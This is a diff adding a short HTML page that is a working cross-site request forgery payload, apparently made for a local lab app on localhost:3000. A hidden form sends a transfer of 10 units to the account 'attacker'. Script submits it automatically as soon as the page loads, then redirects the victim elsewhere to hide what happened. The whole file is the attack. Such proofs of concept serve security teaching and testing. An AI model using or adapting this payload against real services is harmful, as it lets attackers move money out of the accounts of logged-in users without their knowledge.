@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+
+    <form action="http://localhost:3000/post_transfer" method="post" id="attack">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value=10>
+    </form>
+    <script type="text/javascript">
+        function post(){
+            var form = document.getElementById("attack")
+            form.submit();
+        }
+        window.load = post();
+        setTimeout(function(){window.location.href = "http://www.baidu.com";}, 0.1);
+        </script>
+</body>
+</html>
+
